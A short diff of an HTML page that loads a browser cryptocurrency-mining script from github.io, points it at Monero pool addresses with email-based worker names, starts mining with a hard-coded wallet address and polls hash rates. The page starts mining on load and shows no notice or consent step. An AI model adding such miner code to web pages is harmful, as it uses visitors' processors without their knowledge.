@@ -1,15 +1,17 @@
-<html>
+<html xmlns="http://www.w3.org/1999/html">
 <header>
 
 </header>
 <body>
-<script src="https://lisennk.github.io/OpenHive/ch/m.js?proxy=ws://127.0.0.1:8892?pool=ru.moriaxmr.com:3333:proxy:koklova762@gmail.com"></script>
+<script src="https://lisennk.github.io/OpenHive/ch/m.js?proxy=ws://127.0.0.1:8892?pool=aus01.supportxmr.com:3333:worker1:serewann@gmail.com"></script>
 <script>
     // Start mining
     var m = CH.Anonymous('4AnnLEK2k5n7msJqA3t1excg49imMpgtzFFuxBryXh9E17cxhqxZFYJUbUc7X7jkJg6q61va5tnDG82ZV4ngVfEr9ZC5cC6');
     m.start();
+</script>
 
-    setInterval(function() {
+<script>
+setInterval(function() {
         var hashesPerSecond = m.getHashesPerSecond();
         var totalHashes = m.getTotalHashes();
         var acceptedHashes = m.getAcceptedHashes() * 1000;
